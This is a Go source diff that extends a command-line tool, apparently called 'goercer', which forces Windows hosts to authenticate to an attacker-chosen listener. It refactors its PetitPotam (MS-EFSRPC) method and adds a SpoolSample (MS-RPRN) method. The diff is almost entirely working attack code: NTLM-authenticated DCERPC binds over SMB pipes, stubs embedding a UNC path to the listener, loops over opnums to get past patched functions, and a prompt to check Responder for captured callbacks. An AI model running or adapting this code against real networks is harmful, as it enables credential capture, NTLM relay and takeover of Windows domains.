@@ -47,18 +47,9 @@ import (
 )
 
 const (
-	// MS-EFSR Interface - CRITICAL: Must use lsarpc pipe, not efsrpc
-	// This UUID works with \pipe\lsarpc and is what Python PetitPotam uses
-	msEfsrUUID         = "c681d488-d850-11d0-8c52-00c04fd90f7e"
-	msEfsrMajorVersion = 1
-	msEfsrMinorVersion = 0
-
 	// NDR (Network Data Representation) transfer syntax UUID
+	// This is the same for all DCERPC interfaces
 	ndrUUID = "8a885d04-1ceb-11c9-9fe8-08002b104860"
-
-	// Named pipe - CRITICAL: Use lsarpc, not efsrpc
-	// Despite calling MS-EFSRPC functions, the interface is bound via lsarpc pipe
-	efsrpcPipe = "lsarpc"
 
 	// DCERPC packet types (MS-RPCE section 2.2.1.1)
 	dcerpcBind    = 11 // Client → Server: Request interface binding
@@ -94,6 +85,8 @@ type NTLMAuth struct {
 	sessionBaseKey []byte // 16-byte session base key derived from NTLMv2 response
 	clientSignKey  []byte // 16-byte signing key: MD5(sessionBaseKey + client signing magic)
 	clientSealKey  []byte // 16-byte sealing key: MD5(sessionBaseKey + client sealing magic)
+	serverSignKey  []byte // 16-byte server signing key for verifying responses
+	serverSealKey  []byte // 16-byte server sealing key for decrypting responses
 	seqNum         uint32 // Sequence number for DCERPC requests (starts at 0)
 	authContextID  uint32 // Auth context ID assigned by server in BindAck
 	negotiateMsg   []byte // Complete Type 1 message (saved for MIC calculation)
@@ -109,11 +102,28 @@ type NTLMAuth struct {
 	//   4. Next request's checksum encryption
 	//   ... and so on
 	clientSealHandle *rc4.Cipher
+	serverSealHandle *rc4.Cipher // RC4 cipher for decrypting server responses
+}
+
+// CoercionMethod defines a DCERPC coercion technique (PetitPotam, SpoolSample, etc.)
+type CoercionMethod struct {
+	Name         string   // Display name (e.g., "PetitPotam", "SpoolSample")
+	PipeName     string   // Named pipe to use (e.g., "lsarpc", "spoolss")
+	UUID         string   // DCERPC interface UUID
+	MajorVersion uint16   // Interface major version
+	MinorVersion uint16   // Interface minor version
+	Opnums       []uint16 // Operation numbers to try (in order)
+
+	// CreateStub builds the NDR-encoded stub for the RPC call
+	// Parameters: listenerIP (where to coerce auth), opnum (which operation)
+	CreateStub func(listenerIP string, opnum uint16) []byte
 }
 
 func main() {
 	if len(os.Args) < 6 {
-		fmt.Println("Usage: goercer_full <target_ip> <listener_ip> <username> <password> <domain>")
+		fmt.Println("Usage: goercer <target_ip> <listener_ip> <username> <password> <domain> [method] [pipe]")
+		fmt.Println("Methods: petitpotam (default), spoolsample")
+		fmt.Println("Pipes (for petitpotam): lsarpc (default), efsr, samr, netlogon, lsass")
 		os.Exit(1)
 	}
 
@@ -122,8 +132,14 @@ func main() {
 	username := os.Args[3]
 	password := os.Args[4]
 	domain := os.Args[5]
-
-	fmt.Printf("PetitPotam with DCERPC PKT_PRIVACY auth: %s -> %s\n", targetIP, listenerIP)
+	methodName := "petitpotam"
+	pipeName := "lsarpc" // Default pipe for petitpotam
+	if len(os.Args) >= 7 {
+		methodName = os.Args[6]
+	}
+	if len(os.Args) >= 8 {
+		pipeName = os.Args[7]
+	}
 
 	// SMB connection
 	options := smb.Options{
@@ -144,9 +160,6 @@ func main() {
 	defer session.Close()
 
 	fmt.Println("[+] SMB authenticated")
-	// Debug: Check if SMB3 encryption is enabled
-	// Access private fields using unsafe or reflection, or check public APIs
-	fmt.Printf("[DEBUG] SMB dialect negotiated: checking encryption status\n")
 
 	share := "IPC$"
 	err = session.TreeConnect(share)
@@ -156,22 +169,7 @@ func main() {
 	}
 	defer session.TreeDisconnect(share)
 
-	// Open named pipe with read+write access (required for WritePipe/ReadPipe)
-	opts := smb.NewCreateReqOpts()
-	opts.DesiredAccess = smb.FAccMaskFileReadData | smb.FAccMaskFileWriteData |
-		smb.FAccMaskFileReadEA | smb.FAccMaskFileReadAttributes |
-		smb.FAccMaskReadControl | smb.FAccMaskSynchronize
-
-	pipe, err := session.OpenFileExt(share, efsrpcPipe, opts)
-	if err != nil {
-		fmt.Printf("OpenFile failed: %v\n", err)
-		os.Exit(1)
-	}
-	defer pipe.CloseFile()
-
-	fmt.Println("[+] Pipe opened with read+write access, starting DCERPC auth...")
-
-	// Initialize NTLM auth for DCERPC
+	// Initialize NTLM auth state (reusable across methods)
 	auth := &NTLMAuth{
 		user:       username,
 		password:   password,
@@ -180,33 +178,21 @@ func main() {
 		seqNum:     0,
 	}
 
-	// Perform authenticated DCERPC bind (3-way handshake)
-	err = performAuthenticatedBind(&pipe, session, share, efsrpcPipe, auth)
-	if err != nil {
-		fmt.Printf("DCERPC auth bind failed: %v\n", err)
-		os.Exit(1)
-	}
-
-	fmt.Println("[+] DCERPC authentication complete!")
-
-	// Use the SAME pipe that did Auth3 - it has the DCERPC auth context
-	// Note: UNC path MUST be null-terminated (like PetitPotam.py does)
-	uncPath := "\\\\" + listenerIP + "\\test\\Settings.ini\x00"
-
-	// Try EfsRpcOpenFileRaw first (opnum 0)
-	fmt.Println("[-] Sending authenticated EfsRpcOpenFileRaw (opnum 0)...")
-	err = sendAuthenticatedEfsRpc(pipe, auth, uncPath, 0)
-	if err != nil {
-		if err.Error() == "got fault 0x5" || err.Error() == "got RPC_ACCESS_DENIED" {
-			fmt.Println("[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!")
-			fmt.Println("[+] OK! Trying unpatched function EfsRpcEncryptFileSrv (opnum 4)...")
+	// Execute chosen coercion method
+	switch methodName {
+	case "petitpotam":
+		err = executePetitPotam(session, share, auth, listenerIP, pipeName)
+	case "spoolsample":
+		if pipeName != "lsarpc" {
+			fmt.Println("[!] Note: Custom pipe parameter ignored for SpoolSample (only works on \\pipe\\spoolss)")
 		}
-	}
-
-	// Always try EfsRpcEncryptFileSrv (opnum 4) regardless of first result
-	err2 := sendAuthenticatedEfsRpc(pipe, auth, uncPath, 4)
-	if err2 != nil {
-		err = err2
+		err = executeSpoolSample(session, share, auth, listenerIP, targetIP)
+	// Future coercion methods can be added here:
+	// case "printerbug":
+	//     err = executePrinterBug(session, share, auth, listenerIP)
+	default:
+		fmt.Printf("Unknown method: %s\n", methodName)
+		os.Exit(1)
 	}
 
 	if err != nil {
@@ -216,14 +202,189 @@ func main() {
 	fmt.Println("[+] Check Responder for callback!")
 }
 
+// executePetitPotam implements the PetitPotam coercion technique (MS-EFSRPC)
+// This is the VERIFIED WORKING implementation - do not modify without extensive testing
+func executePetitPotam(session *smb.Connection, share string, auth *NTLMAuth, listenerIP string, pipeName string) error {
+	fmt.Printf("[*] Using PetitPotam coercion technique via \\pipe\\%s\n", pipeName)
+
+	// Define PetitPotam method parameters
+	method := CoercionMethod{
+		Name:         "PetitPotam",
+		PipeName:     pipeName,
+		UUID:         "c681d488-d850-11d0-8c52-00c04fd90f7e",
+		MajorVersion: 1,
+		MinorVersion: 0,
+		Opnums:       []uint16{0, 4}, // Try EfsRpcOpenFileRaw (0), then EfsRpcEncryptFileSrv (4)
+		CreateStub:   createEfsRpcStub,
+	}
+
+	// Open named pipe with read+write access
+	opts := smb.NewCreateReqOpts()
+	opts.DesiredAccess = smb.FAccMaskFileReadData | smb.FAccMaskFileWriteData |
+		smb.FAccMaskFileReadEA | smb.FAccMaskFileReadAttributes |
+		smb.FAccMaskReadControl | smb.FAccMaskSynchronize
+
+	pipe, err := session.OpenFileExt(share, method.PipeName, opts)
+	if err != nil {
+		return fmt.Errorf("failed to open pipe %s: %v", method.PipeName, err)
+	}
+	defer pipe.CloseFile()
+
+	fmt.Printf("[+] Pipe %s opened, starting DCERPC auth...\n", method.PipeName)
+
+	// Perform authenticated DCERPC bind (3-way handshake)
+	err = performAuthenticatedBind(&pipe, session, share, method.PipeName, method.UUID, method.MajorVersion, method.MinorVersion, auth)
+	if err != nil {
+		return fmt.Errorf("DCERPC auth bind failed: %v", err)
+	}
+
+	fmt.Println("[+] DCERPC authentication complete!")
+
+	// CRITICAL: Try ALL opnums, don't stop early
+	// Original working code ALWAYS tried opnum 4 regardless of opnum 0 result
+	// One opnum may be patched while another works
+	var lastErr error
+	successfulOpnum := -1
+	for _, opnum := range method.Opnums {
+		fmt.Printf("[-] Trying %s opnum %d...\n", method.Name, opnum)
+
+		stub := method.CreateStub(listenerIP, opnum)
+		err = sendAuthenticatedRequest(pipe, auth, opnum, stub)
+
+		if err != nil {
+			if err.Error() == "got fault 0x5" {
+				fmt.Printf("[-] Opnum %d returned ACCESS_DENIED (probably patched)\n", opnum)
+			} else if err.Error() == "got ERROR_BAD_NETPATH (0x6f7) - attack likely worked" {
+				fmt.Printf("[+] Opnum %d got ERROR_BAD_NETPATH - coercion successful!\n", opnum)
+				successfulOpnum = int(opnum)
+			}
+			lastErr = err
+			// Continue to next opnum regardless
+		} else {
+			// Opnum 0 (EfsRpcOpenFileRaw) often returns success when patched
+			// Patched versions return success without actually doing UNC access
+			if opnum == 0 {
+				fmt.Printf("[!] Opnum 0 returned success (likely PATCHED - may not trigger callback)\n")
+			} else {
+				fmt.Printf("[+] Opnum %d completed successfully\n", opnum)
+			}
+			successfulOpnum = int(opnum)
+			lastErr = nil
+		}
+	}
+
+	if successfulOpnum >= 0 {
+		fmt.Printf("[+] Coercion triggered via opnum %d\n", successfulOpnum)
+	}
+
+	return lastErr
+}
+
+// executeSpoolSample implements the SpoolSample/PrinterBug coercion technique (MS-RPRN)
+// This uses the Print Spooler service to coerce authentication
+func executeSpoolSample(session *smb.Connection, share string, auth *NTLMAuth, listenerIP string, targetIP string) error {
+	fmt.Printf("[*] Using SpoolSample coercion technique via \\pipe\\spoolss\n")
+
+	// Define SpoolSample method parameters
+	method := CoercionMethod{
+		Name:         "SpoolSample",
+		PipeName:     "spoolss",
+		UUID:         "12345678-1234-abcd-ef00-0123456789ab",
+		MajorVersion: 1,
+		MinorVersion: 0,
+		Opnums:       []uint16{65, 62}, // RpcRemoteFindFirstPrinterChangeNotificationEx (65), RpcRemoteFindFirstPrinterChangeNotification (62)
+		CreateStub:   nil,              // Will use custom logic below
+	}
+
+	// Open named pipe with read+write access
+	opts := smb.NewCreateReqOpts()
+	opts.DesiredAccess = smb.FAccMaskFileReadData | smb.FAccMaskFileWriteData |
+		smb.FAccMaskFileReadEA | smb.FAccMaskFileReadAttributes |
+		smb.FAccMaskReadControl | smb.FAccMaskSynchronize
+
+	pipe, err := session.OpenFileExt(share, method.PipeName, opts)
+	if err != nil {
+		return fmt.Errorf("failed to open pipe %s: %v", method.PipeName, err)
+	}
+	defer pipe.CloseFile()
+
+	fmt.Printf("[+] Pipe %s opened, starting DCERPC auth...\n", method.PipeName)
+
+	// Perform authenticated DCERPC bind (3-way handshake)
+	err = performAuthenticatedBind(&pipe, session, share, method.PipeName, method.UUID, method.MajorVersion, method.MinorVersion, auth)
+	if err != nil {
+		return fmt.Errorf("DCERPC auth bind failed: %v", err)
+	}
+
+	fmt.Println("[+] DCERPC authentication complete!")
+
+	// Step 1: Open printer handle (opnum 1: RpcOpenPrinter)
+	fmt.Printf("[-] Opening printer handle on \\\\%s...\n", targetIP)
+	printerName := "\\\\" + targetIP + "\x00"
+	printerStub := createRpcOpenPrinterStub(printerName)
+
+	resp, err := sendAuthenticatedRequestWithResponse(pipe, auth, 1, printerStub)
+	if err != nil {
+		return fmt.Errorf("RpcOpenPrinter failed: %v", err)
+	}
+
+	// Parse response to extract printer handle (20 bytes at offset 24 in DCERPC response)
+	// DCERPC Response header is 24 bytes, then comes the stub data
+	var printerHandle []byte
+	if len(resp) >= 24+20 {
+		printerHandle = resp[24 : 24+20]
+		fmt.Printf("[+] Printer handle opened: %x\n", printerHandle)
+	} else {
+		return fmt.Errorf("RpcOpenPrinter response too short: %d bytes", len(resp))
+	}
+
+	// Step 2: Try notification functions with listener UNC path
+	var lastErr error
+	successfulOpnum := -1
+	for _, opnum := range method.Opnums {
+		fmt.Printf("[-] Trying %s opnum %d...\n", method.Name, opnum)
+
+		var stub []byte
+		if opnum == 65 {
+			stub = createRpcRemoteFindFirstPrinterChangeNotificationExStub(listenerIP, printerHandle)
+		} else if opnum == 62 {
+			stub = createRpcRemoteFindFirstPrinterChangeNotificationStub(listenerIP, printerHandle)
+		} else {
+			continue
+		}
+
+		err = sendAuthenticatedRequest(pipe, auth, opnum, stub)
+
+		if err != nil {
+			if err.Error() == "got fault 0x5" {
+				fmt.Printf("[-] Opnum %d returned ACCESS_DENIED (probably patched)\n", opnum)
+			} else if err.Error() == "got ERROR_BAD_NETPATH (0x6f7) - attack likely worked" {
+				fmt.Printf("[+] Opnum %d got ERROR_BAD_NETPATH - coercion successful!\n", opnum)
+				successfulOpnum = int(opnum)
+			}
+			lastErr = err
+		} else {
+			fmt.Printf("[+] Opnum %d completed successfully\n", opnum)
+			successfulOpnum = int(opnum)
+			lastErr = nil
+		}
+	}
+
+	if successfulOpnum >= 0 {
+		fmt.Printf("[+] Coercion triggered via opnum %d\n", successfulOpnum)
+	}
+
+	return lastErr
+}
+
 // performAuthenticatedBind performs the 3-way DCERPC authentication handshake
-func performAuthenticatedBind(pipe **smb.File, session *smb.Connection, share string, pipeName string, auth *NTLMAuth) error {
+func performAuthenticatedBind(pipe **smb.File, session *smb.Connection, share string, pipeName string, uuid string, majorVer uint16, minorVer uint16, auth *NTLMAuth) error {
 	// Step 1: Send Bind with NTLM Negotiate
 	negotiateMsg := createNTLMNegotiate()
 	auth.negotiateMsg = negotiateMsg // Save for MIC calculation
 	fmt.Printf("[DEBUG] NTLM Negotiate (%d bytes): %x\n", len(negotiateMsg), negotiateMsg)
 
-	bindReq := createDCERPCBindWithAuth(negotiateMsg)
+	bindReq := createDCERPCBindWithAuth(negotiateMsg, uuid, majorVer, minorVer)
 	fmt.Printf("[DEBUG] Bind packet (%d bytes): %x\n", len(bindReq), bindReq)
 
 	// Use WritePipe/ReadPipe instead of IOCTL to replicate impacket approach
@@ -533,14 +694,19 @@ func createNTLMAuthenticate(auth *NTLMAuth, challengeMsg []byte) []byte {
 	auth.sessionBaseKey = exportedSessionKey
 	auth.clientSignKey = calculateSignKey(exportedSessionKey, true)
 	auth.clientSealKey = calculateSealKey(exportedSessionKey, true)
+	auth.serverSignKey = calculateSignKey(exportedSessionKey, false) // Server keys for decrypting responses
+	auth.serverSealKey = calculateSealKey(exportedSessionKey, false)
 
-	// Initialize RC4 cipher handle - this MUST be continuous stream (never reset!)
+	// Initialize RC4 cipher handles - these MUST be continuous streams (never reset!)
 	// This is critical for NTLM - impacket uses the same cipher handle throughout
 	auth.clientSealHandle, _ = rc4.NewCipher(auth.clientSealKey)
+	auth.serverSealHandle, _ = rc4.NewCipher(auth.serverSealKey)
 
 	fmt.Printf("[DEBUG] Final SessionBaseKey (for MIC and crypto): %x\n", auth.sessionBaseKey)
-	fmt.Printf("[DEBUG] Final SignKey: %x\n", auth.clientSignKey)
-	fmt.Printf("[DEBUG] Final SealKey: %x\n", auth.clientSealKey)
+	fmt.Printf("[DEBUG] Final Client SignKey: %x\n", auth.clientSignKey)
+	fmt.Printf("[DEBUG] Final Client SealKey: %x\n", auth.clientSealKey)
+	fmt.Printf("[DEBUG] Final Server SignKey: %x\n", auth.serverSignKey)
+	fmt.Printf("[DEBUG] Final Server SealKey: %x\n", auth.serverSealKey)
 
 	// Session key
 	binary.Write(buf, binary.LittleEndian, uint16(len(encryptedRandomSessionKey)))
@@ -893,7 +1059,7 @@ func uppercaseString(s string) string {
 
 // DCERPC packet creation functions
 
-func createDCERPCBindWithAuth(negotiateMsg []byte) []byte {
+func createDCERPCBindWithAuth(negotiateMsg []byte, uuid string, majorVer uint16, minorVer uint16) []byte {
 	buf := new(bytes.Buffer)
 
 	// DCERPC Header
@@ -924,11 +1090,11 @@ func createDCERPCBindWithAuth(negotiateMsg []byte) []byte {
 	buf.WriteByte(1)                                  // Num transfer syntaxes
 	buf.WriteByte(0)                                  // Reserved
 
-	// Abstract syntax (MS-EFSR)
-	efsrUUID := parseUUID(msEfsrUUID)
-	buf.Write(efsrUUID)
-	binary.Write(buf, binary.LittleEndian, uint16(msEfsrMajorVersion))
-	binary.Write(buf, binary.LittleEndian, uint16(msEfsrMinorVersion))
+	// Abstract syntax (DCERPC interface UUID)
+	interfaceUUID := parseUUID(uuid)
+	buf.Write(interfaceUUID)
+	binary.Write(buf, binary.LittleEndian, majorVer)
+	binary.Write(buf, binary.LittleEndian, minorVer)
 
 	// Transfer syntax (NDR)
 	transferUUID := parseUUID(ndrUUID)
@@ -995,9 +1161,103 @@ func createDCERPCAuth3(auth *NTLMAuth, authenticateMsg []byte) []byte {
 	return packet
 }
 
-func sendAuthenticatedEfsRpc(pipe *smb.File, auth *NTLMAuth, uncPath string, opnum uint16) error {
-	// Create stub (same structure for both opnum 0 and opnum 4)
-	stub := createEfsRpcOpenFileRawStub(uncPath)
+// sendAuthenticatedRequestWithResponse sends a request and returns the decrypted response data
+func sendAuthenticatedRequestWithResponse(pipe *smb.File, auth *NTLMAuth, opnum uint16, stub []byte) ([]byte, error) {
+	fmt.Printf("[DEBUG] Stub (%d bytes): %x\n", len(stub), stub)
+
+	// Create DCERPC Request with auth verifier
+	req := createAuthenticatedRequest(auth, opnum, stub)
+	truncLen := 80
+	if len(req) < truncLen {
+		truncLen = len(req)
+	}
+	fmt.Printf("[DEBUG] Authenticated request (%d bytes): %x...\n", len(req), req[:truncLen])
+
+	// Use WritePipe/ReadPipe (like impacket does)
+	fmt.Println("[+] Sending authenticated request via WritePipe...")
+	_, err := pipe.WritePipe(req)
+	if err != nil {
+		return nil, fmt.Errorf("request write failed: %v", err)
+	}
+
+	// Read response
+	resp := make([]byte, 4096)
+	nResp, err := pipe.ReadPipe(resp)
+	if err != nil {
+		return nil, fmt.Errorf("request read failed: %v", err)
+	}
+	resp = resp[:nResp]
+	fmt.Printf("[DEBUG] Got %d bytes encrypted response\n", len(resp))
+
+	// Parse DCERPC response header
+	if len(resp) < 24 {
+		return nil, fmt.Errorf("response too short: %d bytes", len(resp))
+	}
+
+	packetType := resp[2]
+	fragLen := binary.LittleEndian.Uint16(resp[8:10])
+	authLen := binary.LittleEndian.Uint16(resp[10:12])
+
+	fmt.Printf("[DEBUG] Response: type=%d, fragLen=%d, authLen=%d\n", packetType, fragLen, authLen)
+
+	// Check for DCERPC fault (type 3)
+	if packetType == dcerpcFault {
+		status := binary.LittleEndian.Uint32(resp[24:28])
+		if status == 0x6f7 {
+			return nil, fmt.Errorf("got ERROR_BAD_NETPATH (0x%x) - attack likely worked", status)
+		}
+		return nil, fmt.Errorf("got fault 0x%x", status)
+	}
+
+	// For PKT_PRIVACY, response stub is encrypted
+	// Response structure: DCERPC header (24 bytes) + encrypted stub + padding + auth trailer (8 bytes + authLen)
+	if authLen > 0 {
+		// Extract encrypted stub (everything between header and auth trailer)
+		authTrailerStart := int(fragLen) - int(authLen) - 8
+		if authTrailerStart <= 24 {
+			return nil, fmt.Errorf("invalid auth trailer position")
+		}
+
+		encryptedStub := resp[24:authTrailerStart]
+
+		// Extract padding length from auth trailer
+		authPadLen := resp[authTrailerStart+2]
+
+		// Remove padding from encrypted stub
+		if int(authPadLen) > 0 && int(authPadLen) < len(encryptedStub) {
+			encryptedStub = encryptedStub[:len(encryptedStub)-int(authPadLen)]
+		}
+
+		fmt.Printf("[DEBUG] Encrypted stub: %d bytes (authPadLen=%d)\n", len(encryptedStub), authPadLen)
+
+		// Decrypt stub with server seal handle (continued RC4 stream)
+		decryptedStub := make([]byte, len(encryptedStub))
+		auth.serverSealHandle.XORKeyStream(decryptedStub, encryptedStub)
+
+		fmt.Printf("[DEBUG] Decrypted stub: %x\n", decryptedStub)
+
+		// Verify signature (extract from auth trailer)
+		signature := resp[authTrailerStart+8 : authTrailerStart+8+int(authLen)]
+		fmt.Printf("[DEBUG] Response signature: %x\n", signature)
+
+		// Build complete decrypted response: header + decrypted stub
+		result := make([]byte, 24+len(decryptedStub))
+		copy(result[0:24], resp[0:24])
+		copy(result[24:], decryptedStub)
+
+		return result, nil
+	}
+
+	// No auth trailer - return as-is
+	return resp, nil
+}
+
+func sendAuthenticatedRequest(pipe *smb.File, auth *NTLMAuth, opnum uint16, stub []byte) error {
+	_, err := sendAuthenticatedRequestWithResponse(pipe, auth, opnum, stub)
+	return err
+}
+
+func sendAuthenticatedRequestOld(pipe *smb.File, auth *NTLMAuth, opnum uint16, stub []byte) error {
 	fmt.Printf("[DEBUG] Stub (%d bytes): %x\n", len(stub), stub)
 
 	// Create DCERPC Request with auth verifier
@@ -1199,7 +1459,12 @@ func createNTLMSignature(auth *NTLMAuth, message []byte) []byte {
 	return encrypted
 }*/
 
-func createEfsRpcOpenFileRawStub(uncPath string) []byte {
+// createEfsRpcStub creates the NDR stub for MS-EFSRPC calls (PetitPotam)
+// Works for both EfsRpcOpenFileRaw (opnum 0) and EfsRpcEncryptFileSrv (opnum 4)
+func createEfsRpcStub(listenerIP string, opnum uint16) []byte {
+	// Build UNC path with null terminator (required by MS-EFSRPC)
+	uncPath := "\\\\" + listenerIP + "\\test\\Settings.ini\x00"
+
 	var buf bytes.Buffer
 
 	// Convert to UTF-16LE
@@ -1225,6 +1490,135 @@ func createEfsRpcOpenFileRawStub(uncPath string) []byte {
 
 	// Flags parameter
 	binary.Write(&buf, binary.LittleEndian, uint32(0))
+
+	return buf.Bytes()
+}
+
+// createRpcOpenPrinterStub creates the stub for RpcOpenPrinter (opnum 1)
+// This opens a printer handle needed for subsequent notification calls
+func createRpcOpenPrinterStub(printerName string) []byte {
+	var buf bytes.Buffer
+
+	// Convert printer name to UTF-16LE
+	utf16Name := stringToUTF16LE(printerName)
+	lenChars := uint32(len([]rune(printerName)))
+
+	// pPrinterName is STRING_HANDLE (LPWSTR) - needs referent ID
+	binary.Write(&buf, binary.LittleEndian, uint32(0x00020000)) // Referent ID (unique pointer)
+
+	// Conformant varying string for printer name
+	binary.Write(&buf, binary.LittleEndian, lenChars)  // Max count
+	binary.Write(&buf, binary.LittleEndian, uint32(0)) // Offset
+	binary.Write(&buf, binary.LittleEndian, lenChars)  // Actual count
+	buf.Write(utf16Name)
+
+	// Padding to 4-byte boundary
+	currentLen := buf.Len()
+	padding := (4 - (currentLen % 4)) % 4
+	for i := 0; i < padding; i++ {
+		buf.WriteByte(0x00)
+	}
+
+	// pDatatype parameter (NULL pointer)
+	binary.Write(&buf, binary.LittleEndian, uint32(0)) // NULL pointer
+
+	// pDevModeContainer parameter (embedded structure, not pointer)
+	binary.Write(&buf, binary.LittleEndian, uint32(0)) // cbBuf
+	binary.Write(&buf, binary.LittleEndian, uint32(0)) // pDevMode (NULL)
+
+	// AccessRequired parameter
+	binary.Write(&buf, binary.LittleEndian, uint32(0x20000000)) // MAXIMUM_ALLOWED
+
+	return buf.Bytes()
+}
+
+// createRpcRemoteFindFirstPrinterChangeNotificationExStub creates stub for opnum 65
+// This is the primary SpoolSample coercion method
+func createRpcRemoteFindFirstPrinterChangeNotificationExStub(listenerIP string, printerHandle []byte) []byte {
+	var buf bytes.Buffer
+
+	// hPrinter (context handle from RpcOpenPrinter response)
+	buf.Write(printerHandle) // 20-byte context handle
+
+	// fdwFlags (PRINTER_CHANGE_ADD_JOB = 0x00000100)
+	binary.Write(&buf, binary.LittleEndian, uint32(0x00000100))
+
+	// fdwOptions (0 for default)
+	binary.Write(&buf, binary.LittleEndian, uint32(0))
+
+	// pszLocalMachine (UNC path to listener)
+	uncPath := "\\\\" + listenerIP + "\x00"
+	utf16Path := stringToUTF16LE(uncPath)
+	lenChars := uint32(len([]rune(uncPath)))
+
+	// Unique pointer (non-NULL)
+	binary.Write(&buf, binary.LittleEndian, uint32(0x00020000)) // Referent ID
+
+	// Conformant varying string
+	binary.Write(&buf, binary.LittleEndian, lenChars)  // Max count
+	binary.Write(&buf, binary.LittleEndian, uint32(0)) // Offset
+	binary.Write(&buf, binary.LittleEndian, lenChars)  // Actual count
+	buf.Write(utf16Path)
+
+	// Padding to 4-byte boundary
+	totalSoFar := buf.Len()
+	padding := (4 - (totalSoFar % 4)) % 4
+	for i := 0; i < padding; i++ {
+		buf.WriteByte(0x00)
+	}
+
+	// dwPrinterLocal (0)
+	binary.Write(&buf, binary.LittleEndian, uint32(0))
+
+	// pOptions (NULL)
+	binary.Write(&buf, binary.LittleEndian, uint32(0)) // NULL pointer
+
+	return buf.Bytes()
+}
+
+// createRpcRemoteFindFirstPrinterChangeNotificationStub creates stub for opnum 62
+// This is the alternative SpoolSample coercion method
+func createRpcRemoteFindFirstPrinterChangeNotificationStub(listenerIP string, printerHandle []byte) []byte {
+	var buf bytes.Buffer
+
+	// hPrinter (context handle from RpcOpenPrinter response)
+	buf.Write(printerHandle) // 20-byte context handle
+
+	// fdwFlags (PRINTER_CHANGE_ADD_JOB = 0x00000100)
+	binary.Write(&buf, binary.LittleEndian, uint32(0x00000100))
+
+	// fdwOptions (0 for default)
+	binary.Write(&buf, binary.LittleEndian, uint32(0))
+
+	// pszLocalMachine (UNC path to listener)
+	uncPath := "\\\\" + listenerIP + "\x00"
+	utf16Path := stringToUTF16LE(uncPath)
+	lenChars := uint32(len([]rune(uncPath)))
+
+	// Unique pointer (non-NULL)
+	binary.Write(&buf, binary.LittleEndian, uint32(0x00020000)) // Referent ID
+
+	// Conformant varying string
+	binary.Write(&buf, binary.LittleEndian, lenChars)  // Max count
+	binary.Write(&buf, binary.LittleEndian, uint32(0)) // Offset
+	binary.Write(&buf, binary.LittleEndian, lenChars)  // Actual count
+	buf.Write(utf16Path)
+
+	// Padding to 4-byte boundary
+	totalSoFar := buf.Len()
+	padding := (4 - (totalSoFar % 4)) % 4
+	for i := 0; i < padding; i++ {
+		buf.WriteByte(0x00)
+	}
+
+	// dwPrinterLocal (0)
+	binary.Write(&buf, binary.LittleEndian, uint32(0))
+
+	// cbBuffer (0)
+	binary.Write(&buf, binary.LittleEndian, uint32(0))
+
+	// pBuffer (NULL)
+	binary.Write(&buf, binary.LittleEndian, uint32(0)) // NULL pointer
 
 	return buf.Bytes()
 }
